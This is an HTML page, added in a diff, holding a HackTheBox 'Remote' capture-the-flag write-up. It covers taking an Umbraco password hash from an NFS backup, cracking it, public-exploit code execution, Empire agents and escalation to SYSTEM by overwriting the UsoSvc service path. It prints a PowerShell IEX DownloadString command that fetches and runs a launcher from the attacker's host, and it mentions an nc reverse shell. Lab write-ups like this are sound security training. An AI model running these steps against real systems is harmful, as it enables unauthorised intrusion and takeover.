@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+	
+<style>
+body {
+
+	background-image: url('images/cool-background.png');
+	background-attachment: fixed;
+	color: #333;
+}
+
+</style>
+
+	<head>
+		<title>HackTheBox Remote Writeup </title>
+		
+		<!-- link to main stylesheet -->
+		<link rel="stylesheet" type="css/main.css">
+	</head>
+	<body>
+		<div class="container">
+    		<div class="blurb">
+        		<h1>HTB Remote</h1>
+				<p> 	
+					<img src="images/remote/remote.png" alt="remote" class="inline"/> <br/> <br/> <br/>
+					
+					We start out with the usual nmap scan <br/> <br/>
+					
+					<img src="images/remote/nmap.png" alt="nmap" class="inline"/> <br/><br/>
+					
+					Points of interest here are that we have anonymous FTP access, a web server, and some nfs shares. <br/> <br/>
+					FTP was a dead end with nothing inside. And on the website we have a dummy Umbraco install. <br/> <br/>
+					
+					<img src="images/remote/web.PNG" alt="umbraco" class="inline"/> <br/> <br/> <br/>
+					
+					The webserver was pretty boring with not a whole lot going on. So I decided to checkout the nfs shares. <br/> <br/>
+					
+					<img src="images/remote/mounts.PNG" alt="nfs" class="inline"/> <br/> <br/> <br/>
+					
+					We can see we have a site_backups share that is accessible. So I copied it over to kali to check it out. <br/> <br/>
+					
+					<img src="images/remote/nfs-backup.PNG" alt="nfs" class="inline"/> <br/> <br/> <br/>
+					
+					Some research into Umbraco showed that it stores its database in a .sdf file inside the App_Data directory. <br/>
+					We can pull out the admin username and hash with a simple grep command. <br/> <br/>
+					
+					<img src="images/remote/hash.PNG" alt="hash" class="inline"/> <br/> <br/> <br/>
+					
+					This hash is easily crackable with something like JohnTheRipper. I threw it at the rockyou.txt wordlist and we get <br/> <br/>
+					
+					<b> admin@htb.local : baconandcheese </b> <br/> <br/>
+					
+					Now that we've got some creds, I did quick search to see if there's any available exploits for Umbraco, and if we have the same vulnerable version. <br/> <br/>
+					
+					<img src="images/remote/umbra-exploits.PNG" alt="umbra exploits" class="inline"/> <br/> <br/> <br/>
+					
+					I ended up using this public exploit script from Github instead - <br/> <br/>
+					
+					<a href="https://github.com/noraj/Umbraco-RCE">https://github.com/noraj/Umbraco-RCE </a> <br/> <br/>
+					
+					Which will essentially let us run any powershell we want on the machine. This sounded like the perfect opportunity to brush up <br/>
+					on our Powershell Empire skills. Our execution flow is going to look something like this - <br/> <br/>
+					
+					                  1 - In empire we generate a powershell launcher, and start up a listener. <br/> <br/>
+					                  2 - Drop the launcher into a launcher.bat file <br/> <br/>
+					                  3 - Start up a python webserver to serve the launcher.bat file <br/> <br/>
+					                  4 - Run the github exploit with <b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/launcher.bat')" </b> <br/> <br/> <br/>
+					
+					This should pull our launcher.bat file, make the connection to our empire agent, which feeds it the rest of a fully interactive shell. <br/>
+					We should end up with a fully interactive empire agent if all goes right. <br/> <br/> <br/>
+					
+					Step 1 - generating a powershell launcher, and start up a listener <br/><br/>
+					<img src="images/remote/emp-listener.PNG" alt="empire" class="inline"/> <br/> <br/> 
+					<img src="images/remote/empire-launcher.PNG" alt="empire" class="inline"/> <br/> <br/> <br/> 
+					
+					Step 2 and 3 - Dropping the launcher into a file, and starting python web server <br/><br/>
+					<img src="images/remote/launcher.PNG" alt="serving the exploit" class="inline"/> <br/> <br/> <br/> 
+					
+					Step 4 - Running the exploit<br/><br/>
+					<img src="images/remote/exp-cli.PNG" alt="running the exploit" class="inline"/><br/> <br/> <br/>  
+					
+					
+					Over in our http server we can see launcher.bat was succesfully pulled from our machine <br/><br/>
+					<img src="images/remote/served.PNG" alt="exploit served" class="inline"/><br/> <br/>
+					
+					In empire we can see we successfully got a connection to our agent :D <br/> <br/>
+					<img src="images/remote/empire-success.PNG" alt="empire success" class="inline"/><br/> <br/>
+					
+					We can now grab the user.txt flag like so - <br/><br/>
+					<img src="images/remote/user-flag.PNG" alt="user flag" class="inline"/><br/> <br/> <br/> <br/>
+					
+					<br/> <br/> <br/> <br/> <br/>
+					
+					
+			
+					<h2> Empire Privesc</h2>
+					Since we already have an empire agent, we might as well run the powerup scripts to see if we can catch any freebies. <br/> <br/>
+			
+					<img src="images/remote/power-up.PNG" alt="empire powerup" class="inline"/><br/> <br/>
+			
+					We can see here that powerup discovers a vulnerable service, UsoSvc. Conveniently, empire has a couple service modules to exploit this for us. <br/>
+					I ended up using the powershell/privesc/powerup/service_stager module. We already know from powerup that we can exploit UsoSvc. We can take a quick <br/>
+					peek at the required settings for the service_stager module to see what we need - <br/>	 <br/>	
+					
+					<img src="images/remote/empire-setting-up-1.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+					3 things we need to make it work, the agent to run it on, the service name (UsoSvc), and the listener. We will also setup a stager for the new listener.  <br/>
+					Our steps from here should be straightforward <br/> <br/> <br/>
+			
+							1. Generate a 2nd empire listener. <br/> <br/>
+							2. Generate a stager for this listener. <br/> <br/>
+							3. Run the service_stager module on our 1st agent, and set it to connect to our new listener. <br/> <br/>
+			
+					In theory this should overwrite the UsoSvc service binary with our new stager, and then make a connection to our new listener, which will feed it the rest of the payload <br/> 
+					hopefully resulting in a SYSTEM/NT AUTHORITY shell. <br/> <br/> <br/>
+			
+					Step 1 - setting up our new listener <br/><br/>
+					<img src="images/remote/empire-2nd-list.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+					Step 2 - setting up our stager <br/><br/>
+					<img src="images/remote/empire-stager.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+					Step 3 - running the service stager module <br/><br/>
+					<img src="images/remote/empire-success-2.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+					We are able to immediately see that empire caught a connection on our new listener and generated a SYSTEM/NT AUTHORITY agent.<br/> <br/>
+					
+					<img src="images/remote/empire-final.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+					All thats left from here is to interact with it and grab our flag <br/> <br/>
+				
+					<img src="images/remote/empire-final-2.PNG" alt="empire" class="inline"/><br/> <br/>
+			
+			
+					Empire is an awesome tool. I went ahead and redid this the manual route as well too. - <br/> <br/> <br/> <br/><br/> <br/>		
+			
+					
+					<h2> Manual Privesc</h2>
+			
+			
+					After spawning a manual shell with our previous exploit (just used a powershell rev shell instead of the empire agent), I dropped powerup onto the box  <br/>
+					to confirm our earlier finding. As expected we get the same result.  <br/> <br/>
+			
+					<img src="images/remote/powerup-manual.PNG" alt="powerup" class="inline"/><br/> <br/>
+			
+					Our steps from here are to overwrite the binary for UsoSvc, start up our listener in kali, and then restart the UsoSvc and we should catch a system shell. <br/>
+					I dropped the windows nc.exe on the box in c:\windows\temp so we can easily send ourselves a shell, and then overwrote the binary path. <br/> <br/>
+																    
+					<img src="images/remote/sc-overwrite-binpath.PNG" alt="binpath overwrite" class="inline"/><br/> <br/>
+			
+					Then we start a nc listener and restart the UsoSvc service <br/> <br/>
+			
+					<img src="images/remote/restart.PNG" alt="restarting usoscvc" class="inline"/><br/> <br/>
+			
+					And finally back in our listener we have our system shell. <br/> <br/>
+			
+					<img src="images/remote/fucking-finally.PNG" alt="system shell" class="inline"/><br/> <br/> <br/> <br/>
+			
+					Thanks for reading!!! <br/> <br/><br/> <br/><br/> <br/>
+					
+			
+			</p>
+    		</div><!-- /.blurb -->
+		<div class="blurb">	
+		</div><!-- /.container -->
+		
+	</body>
+</html>
